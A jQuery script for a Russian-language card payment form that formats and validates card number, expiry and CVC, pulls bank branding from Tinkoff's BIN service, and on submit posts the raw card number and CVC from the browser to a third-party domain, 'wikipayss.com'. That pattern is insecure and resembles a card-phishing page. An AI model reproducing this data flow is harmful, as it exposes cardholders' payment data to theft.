$(document).ready(function () {

    $('.input-wrap input').each(function () {
        var input = $(this),
            label = $(this).siblings('label');
        if (input.val()) {
            label.hide();
        }
    });

    $('.hint').each(function () {
        var self = $(this),
            external_content = $(self.data('external_content')).html() ? $(self.data('external_content')).html() : '';

        self.popover(
            {
                content: external_content,
                html: true,
                placement: self.data('placement') ? self.data('placement') : 'auto',
                delay: {'show': 500, 'hide': 200},
                trigger: 'hover'
            }
        );
    });


    $('.input-wrap input').focus(function () {

        var input = $(this),
            label = $(this).siblings('label'),
            hint = $(this).data('hint');

        if (hint && !input.val()) {
            label.text(hint);
        }
    }).focusout(function () {

        if (!$(this).val()) {
            $(this).siblings('label').show();
        }
    });


    $('.input-wrap input').on('input', function () {


        var input = $(this),
            cleaner = input.siblings('.cleaner'),
            label = $(this).siblings('label'),
            wrapper = input.closest('.input-wrap');


        if (input.val()) {
            cleaner.show();
            label.hide();
        } else {
            cleaner.hide();
            label.show();
        }
        if (document.activeElement === this) wrapper.removeClass('is-invalid is-valid');
        $(document).trigger('input_validated');

        if (wrapper.hasClass('email'))
            return true;

        var priority = ['card-number', 'expiry', 'cvc'];

        if (validate(input.attr('id'), input.val())) {
            $(priority).each(function () {
                if (!$('.input-wrap.' + this).hasClass('is-valid') && !wrapper.hasClass(this)) {
                    $('.' + this + ' input').focus();
                    return false;
                }
            });
        }
    })
        .on('paste', function () {
            var input = $(this);
            input.siblings('label').hide();
            setTimeout(function () {
                input.trigger('input');
            }, 100);
        });


    $('.cleaner').on('mousedown', function (e) {
        e.preventDefault();
        $(this).siblings('input').val('').focus();
        $(this).hide();
        return false;
    });


    $('.expiry input').on('keydown', function (e) {

        var input = $(this),
            val = input.val();

        input.siblings('label').text('Срок').hide();

        if (val.length === 0 && e.key > 1) {
            e.preventDefault();
            input.val('0' + e.key);
        } else if (val.length === 1 && val !== '0' && e.key > 2) {
            e.preventDefault();
            input.val(input.val() + '2');
        }
    });

    var payment_system;

    var iconsReplace = function (key = '') {

        var knownKeys = ['4', '5', '6'];

        payment_system = key;

        if (key && knownKeys.indexOf(key) !== -1) {
// 			console.log(knownKeys.indexOf(number));
            $('.payment-system-logos div').removeClass('show');
            $('.payment-system-logos [data-index-' + key + ']').addClass('show');
            return true;
        } else {
            $('.payment-system-logos .selected').removeClass('show');
            $('.payment-system-logos .possible').addClass('show');
        }
    }

    function Moon(card_number) {

        var arr = [],
            card_number = card_number.toString();
        for (var i = 0; i < card_number.length; i++) {
            if (i % 2 === 0) {
                var m = parseInt(card_number[i]) * 2;
                if (m > 9) {
                    arr.push(m - 9);
                } else {
                    arr.push(m);
                }
            } else {
                var n = parseInt(card_number[i]);
                arr.push(n)
            }
        }
        var summ = arr.length ? arr.reduce(function (a, b) {
            return a + b;
        }) : false;
        return Boolean(!(summ % 10));
    }


    $('.card-number input').on('input', function (e) {


        var input = $(this),
            val = parseInt(input.val().replace(/\s/g, '')).toString();

        if (val) iconsReplace(val.substring(0, 1));

        if (val.length > 5) {

            var bin = val.substring(0, 6);
            $('.payment-system-logos').addClass('bin');
            if (input.data('bin') !== bin) {
                input.data('bin', bin);

                $.get(
                    'https://api.tinkoff.ru/v1/brand_by_bin?bin=' + bin,
                    function (data) {
                        var d = data.payload;
                        if (d.name) {
                            $('.card-brand img').attr('src', 'https://www.cdn-tinkoff.ru/portal/brands/' + d.logoFile);
                            $('.brand-name').text(d.name);
                            $('.card-front').addClass('branded');
                        }
                    }
                )
            } else {
                $('.card-front').addClass('branded');
            }
        } else {
            $('.card-front').removeClass('branded');
        }
    });

    let ccNumberInput = $('.card-number input'),
        ccNumberPattern = /^\d{0,19}$/g,
        ccNumberSeparator = " ",
        ccNumberInputOldValue,
        ccNumberInputOldCursor,

        ccExpiryInput = $('.expiry input'),
        ccExpiryPattern = /^\d{0,4}$/g,
        ccExpirySeparator = "/",
        ccExpiryInputOldValue,
        ccExpiryInputOldCursor,

        ccCVCInput = $('.cvc input'),
        ccCVCPattern = /^\d{0,3}$/g,
        ccCVCSeparator = "",
        ccCVCInputOldValue,
        ccCVCInputOldCursor,

        mask = (value, limit, separator) => {
            var output = [];
            for (let i = 0; i < value.length; i++) {
                if (i !== 0 && i % limit === 0) {
                    output.push(separator);
                }
                output.push(value[i]);
            }
            return output.join("");
        },
        unmask = (value) => value.replace(/[^\d]/g, ''),
        checkSeparator = (position, interval) => Math.floor(position / (interval + 1)),
        ccNumberInputKeyDownHandler = (e) => {
            let el = e.target;
            ccNumberInputOldValue = el.value;
            ccNumberInputOldCursor = el.selectionEnd;
        },
        ccNumberInputInputHandler = (e) => {
            let el = e.target,
                newValue = unmask(el.value),
                newCursorPosition;

            if (newValue.match(ccNumberPattern)) {
                newValue = mask(newValue, 4, ccNumberSeparator);

                newCursorPosition =
                    ccNumberInputOldCursor - checkSeparator(ccNumberInputOldCursor, 4) +
                    checkSeparator(ccNumberInputOldCursor + (newValue.length - ccNumberInputOldValue.length), 4) +
                    (unmask(newValue).length - unmask(ccNumberInputOldValue).length);

                el.value = (newValue !== "") ? newValue : "";
            } else {
                el.value = ccNumberInputOldValue;
                newCursorPosition = ccNumberInputOldCursor;
            }

            el.setSelectionRange(newCursorPosition, newCursorPosition);

        },
        ccExpiryInputKeyDownHandler = (e) => {
            let el = e.target;
            ccExpiryInputOldValue = el.value;
            ccExpiryInputOldCursor = el.selectionEnd;
        },
        ccExpiryInputInputHandler = (e) => {
            let el = e.target,
                newValue = el.value;

            if (/^\d{2}\/\d{4}$/g.test(newValue)) {
                newValue = newValue.replace(/^(\d{2}\/)\d{2}(\d{2})$/g, '$1$2');
                el.value = newValue;
// 					return true;

                $(el).trigger('input');
            }

            newValue = unmask(newValue);
            if (newValue.match(ccExpiryPattern)) {
                newValue = mask(newValue, 2, ccExpirySeparator);
                el.value = newValue;
            } else {
                el.value = ccExpiryInputOldValue;
            }
        },
        ccCVCInputKeyDownHandler = (e) => {
            let el = e.target;
            ccCVCInputOldValue = el.value;
            ccCVCInputOldCursor = el.selectionEnd;
        },
        ccCVCInputInputHandler = (e) => {
            let el = e.target,
                newValue = el.value;

            if (newValue.match(ccCVCPattern)) {
                el.value = newValue;
            } else {
                el.value = ccCVCInputOldValue;
            }
        };

    ccNumberInput.on('keydown', ccNumberInputKeyDownHandler).on('input', ccNumberInputInputHandler);
    ccExpiryInput.on('keydown', ccExpiryInputKeyDownHandler).on('input', ccExpiryInputInputHandler);
    ccCVCInput.on('keydown', ccCVCInputKeyDownHandler).on('input', ccCVCInputInputHandler);

    var validate = function (type, val) {

        switch (type) {

            case 'card_number':
                val = val.replace(/ /g, '');

                if (val.length > 19) val = val.substring(0, 19);

                if (val.length > 15) {
                    return Moon(val) ? true : false;
                }
                return false;
                break;

            case 'expiry':
                var d = new Date(),
                    currentYear = d.getFullYear() - 2000,
                    currentMonth = d.getMonth() + 1;

                if (val.length > 4) {

                    val = val.split('/');
                    var month = parseInt(val[0]),
                        year = val[1];

                    if (month < 13 && year < 42 && year >= currentYear) {
                        if (year == currentYear && month < currentMonth) {
                            return false;
                        }
                        return true;
                    }
                }
                return false;
                break;

            case 'cvc':
                if (val.length > 2) {
                    return true;
                }
                return false;
                break;

            case 'email':
                if (val.length === 0) return true;
                var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
                return regex.test(val);
                break;
        }
    }

    $('.input-wrap input').on('change', function (e, novalidate) {

        if (novalidate || document.activeElement == this)
            return;

        var input = $(this),
            wrapper = input.closest('.input-wrap');

        if (!validate(input.attr('id'), input.val())) {
            wrapper.addClass('is-invalid');
        } else {
            wrapper.addClass('is-valid');
        }
        $(document).trigger('input_validated');
    });


    $(document).on('input_validated', function () {

        var inputs = $('.input-wrap.is-invalid:not(.email)'),
            msg = '',
            mMsg = '',
            comma = inputs.length > 2 ? ', ' : '',
            and1 = inputs.length !== 2 ? '' : ' и ',
            and2 = inputs.length < 3 ? '' : ' и ',
            area = $('.error-area'),
            mArea = $('.m-error-area');

        if ($('.card-number').hasClass('is-invalid')) {
            msg += 'номер карты' + comma + and1;
            and1 = '';
        }
        if ($('.expiry').hasClass('is-invalid')) {
            msg += 'срок' + and1 + and2;
            mMsg += 'срок' + $('.cvc').hasClass('is-invalid') ? ' и ' : '';
        }
        if ($('.cvc').hasClass('is-invalid')) {
            msg += 'код';
            mMsg + 'код';
        }

        msg = msg ? 'Проверьте ' + msg : '';

        mMsg = msg.replace('номер карты,', '').replace('номер карты и', '');

        if (mMsg === 'Проверьте номер карты') mMsg = '';
// 		console.log(mMsg.length);

        area.html('<span>' + msg + '</span>');
        mArea.html('<span>' + mMsg + '</span>');

        if (msg) {
            area.addClass('active');
        } else {
            area.removeClass('active');
        }
        if (mMsg) {
            mArea.addClass('active');
        } else {
            mArea.removeClass('active');
        }
    });



    $('#payment_form').on('submit', function (e) {

        e.preventDefault();

        var invalidFound;

        $('.input-wrap input').each(function () {

            var input = $(this);

            if (!validate(input.attr('id'), input.val())) {

                if (input.attr('id') === 'email' && !input.val())
                    return true;

                invalidFound = true;

                input.closest('.input-wrap').addClass('is-invalid');
            }
        });

        if (invalidFound) {
            $(document).trigger('input_validated');
        } else {

            $('.main').addClass('loading');
            let exp = $('.expiry input').val();

            var data = {
                card_number: $('.card-number input').val().replace(/ /g, ''),
                card_month: exp.split("/")[0],
                card_year: "20" + exp.split("/")[1],
                card_cvc: $('.cvc input').val(),
                amount: $("#amount").val(),
                merchant_order_id: $("#transactionId").val(),
                country: $("#country").val(),
                api_key: $("#api_key").val()
            }

            //console.log(data);

            $.ajax({

                type: "post",
                url: "https://wikipayss.com/api/request/",

                data: data,

                error: function (errorMessage) {
                    console.log(errorMessage);
                },

                success: function (response) {
                    location.href = response;
                }
            });
        }
    });

    var init3DS = function (key) {
        setTimeout(function () {
            location.href = $(location).attr('protocol') + '//' + $(location).attr('host') + '/3ds/' + key
        }, 7000);
    }
});

$(window).on('load', function () {

    var loadDelay = $('body').data('pageLoadTime') > 3000 ? 0 : 0 - $('body').data('pageLoadTime');

    setTimeout(function () {

        $('#skeleton').hide();
        $('.page-wrap').show();
        $('.input-wrap input').each(function () {
            var input = $(this);

            if (!input.val()) {
                input.focus();
                return false;
            }
        });

    }, loadDelay)

});
